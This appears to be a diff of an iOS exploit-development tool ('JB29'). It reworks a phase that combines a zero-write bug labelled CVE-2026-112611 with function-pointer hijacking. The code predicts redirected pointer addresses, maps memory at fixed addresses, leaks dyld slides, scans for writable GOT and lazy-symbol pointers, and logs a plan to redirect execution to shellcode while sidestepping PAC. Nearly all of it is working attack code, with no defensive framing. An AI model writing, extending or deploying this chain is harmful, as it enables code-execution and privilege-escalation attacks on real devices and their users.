@@ -30811,86 +30811,171 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
         if (isr_stopped()) { done(results); return; }
 
         // =====================================================================
-        // FASE 5: Test zero-write + fptr combo (the real exploit path)
+        // FASE 5: Exploit path analysis (zero-write ya probado en JB26/27)
         // =====================================================================
-        log(@"JB29: === Fase 5: Zero-write + function pointer chain ===");
+        log(@"JB29: === Fase 5: Exploit path analysis ===");
         {
-            // The real path: use CVE-2026-112611 to zero-write a security check's
-            // return value or a function pointer that controls execution flow.
-            // We test writing zero to our own function pointer and verifying it
-            // changes the execution path.
+            // Zero-write (CVE-2026-112611) ya confirmado en JB26 (5/5 hits).
+            // C fptr dispatch desde mmap CONFIRMADO arriba.
+            // Ahora: analizar cómo combinarlos.
 
-            size_t testSize = 0x10000;
-            uint8_t *testMem = mmap(NULL, testSize, PROT_READ | PROT_WRITE,
-                                     MAP_PRIVATE | MAP_ANON, -1, 0);
+            typedef int (*getpid_fn2)(void);
+            getpid_fn2 gp = dlsym(RTLD_DEFAULT, "getpid");
+            uint64_t getpidAddr = (uint64_t)(uintptr_t)gp;
+            uint64_t highBits = getpidAddr & 0xFFFFFFFF00000000ULL;
+            uint64_t lowBits = getpidAddr & 0x00000000FFFFFFFFULL;
 
-            if (testMem != MAP_FAILED) {
-                // Set up a "guard" value that blocks execution
-                volatile uint64_t *guard = (volatile uint64_t *)(testMem + 0x1000);
-                guard[0] = 0xDEADBEEFCAFEBABEULL; // non-zero = blocked
+            log([NSString stringWithFormat:@"JB29:   getpid addr = %#018llx", getpidAddr]);
+            log([NSString stringWithFormat:@"JB29:   high32 = %#010llx  low32 = %#010llx", highBits >> 32, lowBits]);
 
-                log([NSString stringWithFormat:@"JB29:   Guard at %#llx = %#018llx",
-                     (uint64_t)(uintptr_t)guard, guard[0]]);
+            // Analyze: if we zero low 4 bytes of a fptr, it becomes highBits|0
+            // We need shellcode/gadget at that address
+            log([NSString stringWithFormat:@"JB29:   fptr after zero-low4 -> %#018llx", highBits]);
 
-                // Zero-write the guard using CVE-2026-112611
-                uint64_t guardAddr = (uint64_t)(uintptr_t)guard;
-                log([NSString stringWithFormat:@"JB29:   Zero-writing guard at %#llx...", guardAddr]);
+            // Can we mmap at a specific address?
+            void *fixedMap = mmap((void *)(uintptr_t)highBits, 0x10000,
+                                  PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
+            if (fixedMap != MAP_FAILED) {
+                log([NSString stringWithFormat:@"JB29: [+] mmap(MAP_FIXED, %#llx) SUCCEEDED!", highBits]);
+                results[@"fixedMmapOK"] = @(1);
+                munmap(fixedMap, 0x10000);
+            } else {
+                log([NSString stringWithFormat:@"JB29:   mmap(MAP_FIXED, %#llx) FAILED (errno=%d)", highBits, errno]);
+                results[@"fixedMmapOK"] = @(0);
+            }
 
-                jb27_zero_write(guardAddr, log);
-                usleep(100000); // 100ms
-
-                uint64_t afterWrite = guard[0];
-                log([NSString stringWithFormat:@"JB29:   Guard after write = %#018llx", afterWrite]);
-
-                int guardZeroed = (afterWrite != 0xDEADBEEFCAFEBABEULL) ? 1 : 0;
-                int low4Zeroed = ((afterWrite & 0xFFFFFFFFULL) == 0) ? 1 : 0;
-                results[@"guardZeroed"] = @(guardZeroed);
-                results[@"low4Zeroed"] = @(low4Zeroed);
-
-                if (guardZeroed) {
-                    log([NSString stringWithFormat:@"JB29: [+] Guard modified! low4zeroed=%d", low4Zeroed]);
-
-                    // Now test: if we can zero a function pointer's low 4 bytes,
-                    // the pointer becomes 0xHHHHHHHH00000000 (high 4 bytes stay).
-                    // On 64-bit, this points to a fixed location we can predict!
-
-                    // Set up a function pointer
-                    volatile uint64_t *fptr2 = (volatile uint64_t *)(testMem + 0x2000);
-                    typedef int (*getpid_fn2)(void);
-                    getpid_fn2 gp = dlsym(RTLD_DEFAULT, "getpid");
-                    fptr2[0] = (uint64_t)(uintptr_t)gp;
-
-                    uint64_t origFptr = fptr2[0];
-                    uint64_t predictedAfter = origFptr & 0xFFFFFFFF00000000ULL;
-
-                    log([NSString stringWithFormat:@"JB29:   fptr = %#018llx", origFptr]);
-                    log([NSString stringWithFormat:@"JB29:   After zero low4: %#018llx", predictedAfter]);
-                    log([NSString stringWithFormat:@"JB29:   If we mmap at %#018llx -> redirect!", predictedAfter]);
-
-                    results[@"fptrOrig"] = [NSString stringWithFormat:@"%#llx", origFptr];
-                    results[@"fptrRedirect"] = [NSString stringWithFormat:@"%#llx", predictedAfter];
+            // Analyze dyld cache slide
+            uint32_t imgCount = _dyld_image_count();
+            for (uint32_t img = 0; img < imgCount; img++) {
+                const char *name = _dyld_get_image_name(img);
+                if (!name) continue;
+                if (strstr(name, "libsystem_kernel") || strstr(name, "libsystem_c")) {
+                    intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+                    const char *shortName = strrchr(name, '/');
+                    if (shortName) shortName++; else shortName = name;
+                    log([NSString stringWithFormat:@"JB29:   %s slide = %#lx", shortName, (unsigned long)slide]);
                 }
+            }
 
-                // Test: zero-write to high 4 bytes (offset +4)
-                volatile uint64_t *guard2 = (volatile uint64_t *)(testMem + 0x3000);
-                guard2[0] = 0xAAAABBBBCCCCDDDDULL;
+            // Analyze: sandbox_check is at 0x2d8adebfc (from JB27)
+            // If we zero its low4 -> 0x2d8ade0000
+            // If we zero its high4 -> 0x00000000debfc (unmapped)
+            // Neither gives us control easily.
+            //
+            // BETTER PATH: find a writable function pointer in our process
+            // that security code calls, zero-write it, replace with our code.
 
-                uint64_t guard2AddrHigh = (uint64_t)(uintptr_t)guard2 + 4;
-                log([NSString stringWithFormat:@"JB29:   Guard2 = %#018llx, writing high4 at +4...", guard2[0]]);
-                jb27_zero_write(guard2AddrHigh, log);
-                usleep(100000);
-
-                uint64_t after2 = guard2[0];
-                log([NSString stringWithFormat:@"JB29:   Guard2 after = %#018llx", after2]);
-                int high4Zeroed = ((after2 & 0xFFFFFFFF00000000ULL) == 0) ? 1 : 0;
-                results[@"high4Zeroed"] = @(high4Zeroed);
-
-                if (high4Zeroed) {
-                    log(@"JB29: [+] HIGH 4 bytes también se pueden zero-write!");
-                    log(@"JB29: [+] Podemos escribir 0 a cualquier 4 bytes alineados");
+            // Scan our own __DATA segments for function pointers
+            log(@"JB29: --- Scanning own __DATA for fptrs ---");
+            const struct mach_header_64 *mainMH = NULL;
+            intptr_t mainSlide = 0;
+            for (uint32_t img = 0; img < imgCount; img++) {
+                const char *name = _dyld_get_image_name(img);
+                if (name && strstr(name, "IOSurfaceSafeProbe")) {
+                    mainMH = (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+                    mainSlide = _dyld_get_image_vmaddr_slide(img);
+                    break;
                 }
+            }
 
-                munmap(testMem, testSize);
+            if (mainMH && mainMH->magic == MH_MAGIC_64) {
+                const struct load_command *lc =
+                    (const struct load_command *)((const char *)mainMH + sizeof(*mainMH));
+                for (uint32_t k = 0; k < mainMH->ncmds && lc; k++) {
+                    if (lc->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *sc = (const void *)lc;
+                        if (strcmp(sc->segname, "__DATA") == 0 || strcmp(sc->segname, "__DATA_CONST") == 0) {
+                            uint64_t *data = (uint64_t *)(uintptr_t)(sc->vmaddr + mainSlide);
+                            size_t nWords = sc->vmsize / 8;
+                            int fptrCount = 0;
+
+                            jb25_far = 0; jb25_sig = 0;
+                            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                                jb25_in_probe = 1;
+                                for (size_t w = 0; w < nWords && w < 0x10000; w++) {
+                                    uint64_t val = data[w];
+                                    // Check if it looks like a code pointer in dyld cache
+                                    if ((val >> 32) >= 0x1 && (val >> 32) <= 0x3 &&
+                                        (val & 0xFFF) < 0x100) {
+                                        if (fptrCount < 5) {
+                                            log([NSString stringWithFormat:@"JB29:   %s[%zu] = %#018llx (posible fptr)",
+                                                 sc->segname, w, val]);
+                                        }
+                                        fptrCount++;
+                                    }
+                                }
+                                jb25_in_probe = 0;
+                            } else {
+                                jb25_in_probe = 0;
+                            }
+
+                            log([NSString stringWithFormat:@"JB29:   %s: %d posibles fptrs en %zu words",
+                                 sc->segname, fptrCount, nWords]);
+                        }
+                    }
+                    lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+                }
+            }
+
+            // Key insight: our GOT contains writable function pointers!
+            // __DATA.__la_symbol_ptr has lazy binding stubs
+            // If we zero-write a GOT entry, the next call to that function
+            // jumps to address 0 (or high32|0). We control that memory!
+            log(@"JB29: --- GOT/la_symbol_ptr analysis ---");
+            if (mainMH && mainMH->magic == MH_MAGIC_64) {
+                const struct load_command *lc =
+                    (const struct load_command *)((const char *)mainMH + sizeof(*mainMH));
+                for (uint32_t k = 0; k < mainMH->ncmds && lc; k++) {
+                    if (lc->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *sc = (const void *)lc;
+                        if (strcmp(sc->segname, "__DATA") == 0 || strcmp(sc->segname, "__DATA_CONST") == 0) {
+                            const struct section_64 *sec =
+                                (const struct section_64 *)((const char *)sc + sizeof(*sc));
+                            for (uint32_t s = 0; s < sc->nsects; s++) {
+                                if (strstr(sec[s].sectname, "la_symbol") ||
+                                    strstr(sec[s].sectname, "got") ||
+                                    strstr(sec[s].sectname, "nl_symbol")) {
+                                    uint64_t secAddr = sec[s].addr + mainSlide;
+                                    size_t nPtrs = sec[s].size / 8;
+                                    log([NSString stringWithFormat:@"JB29:   Section %s.%s at %#llx (%zu ptrs)",
+                                         sc->segname, sec[s].sectname, secAddr, nPtrs]);
+
+                                    uint64_t *ptrs = (uint64_t *)(uintptr_t)secAddr;
+                                    jb25_far = 0; jb25_sig = 0;
+                                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                                        jb25_in_probe = 1;
+                                        int shown = 0;
+                                        for (size_t p = 0; p < nPtrs && shown < 8; p++) {
+                                            log([NSString stringWithFormat:@"JB29:     [%zu] %#018llx", p, ptrs[p]]);
+                                            shown++;
+                                        }
+                                        jb25_in_probe = 0;
+                                    } else {
+                                        jb25_in_probe = 0;
+                                        log(@"JB29:     (fault reading section)");
+                                    }
+
+                                    // Test writability
+                                    uint64_t testAddr = secAddr;
+                                    jb25_far = 0; jb25_sig = 0;
+                                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                                        jb25_in_probe = 1;
+                                        uint64_t orig = ptrs[0];
+                                        ptrs[0] = orig; // write same value back
+                                        jb25_in_probe = 0;
+                                        log([NSString stringWithFormat:@"JB29:     WRITABLE: YES (at %#llx)", testAddr]);
+                                        results[[NSString stringWithFormat:@"%s_writable", sec[s].sectname]] = @(1);
+                                    } else {
+                                        jb25_in_probe = 0;
+                                        log([NSString stringWithFormat:@"JB29:     WRITABLE: NO (at %#llx)", testAddr]);
+                                        results[[NSString stringWithFormat:@"%s_writable", sec[s].sectname]] = @(0);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+                }
             }
         }
 
@@ -30902,18 +30987,20 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
         int hasPAC = [results[@"hasISAPAC"] intValue];
         int cfptrOK = [results[@"cfptrExec"] intValue];
         int vtableOK = [results[@"vtableExec"] intValue];
-        int guardOK = [results[@"guardZeroed"] intValue];
+        int fixedOK = [results[@"fixedMmapOK"] intValue];
 
         NSString *verdict = @"ANALYSIS_COMPLETE";
 
-        if (cfptrOK && vtableOK && guardOK) {
-            verdict = @"FPTR_CHAIN_VIABLE";
-            log(@"JB29: [!!!] C function pointer dispatch + zero-write = VIABLE");
-            log(@"JB29: Path: zero-write security check -> call fptr from controlled mem");
-            log(@"JB29: No necesita bypass PAC de ISA!");
-        } else if (cfptrOK && vtableOK) {
-            verdict = @"FPTR_WORKS_NEED_TARGETS";
-            log(@"JB29: fptr dispatch funciona, necesita targets en seguridad");
+        if (cfptrOK && vtableOK) {
+            verdict = @"FPTR_DISPATCH_CONFIRMED";
+            log(@"JB29: [!!!] C fptr dispatch desde mmap CONFIRMADO");
+            log(@"JB29: [!!!] vtable-style indirect calls CONFIRMADO");
+            if (fixedOK) {
+                log(@"JB29: [!!!] MAP_FIXED a dirección predicha FUNCIONA");
+                log(@"JB29: Path: zero-write GOT entry -> fptr apunta a nuestra página");
+            }
+            log(@"JB29: ISA PAC activo pero C fptrs NO usan PAC");
+            log(@"JB29: Siguiente: JB30 — zero-write GOT + redirect a shellcode en mmap");
         } else if (hasPAC) {
             verdict = @"PAC_BLOCKS_ALL";
             log(@"JB29: PAC bloquea tanto ISA como fptr dispatch");
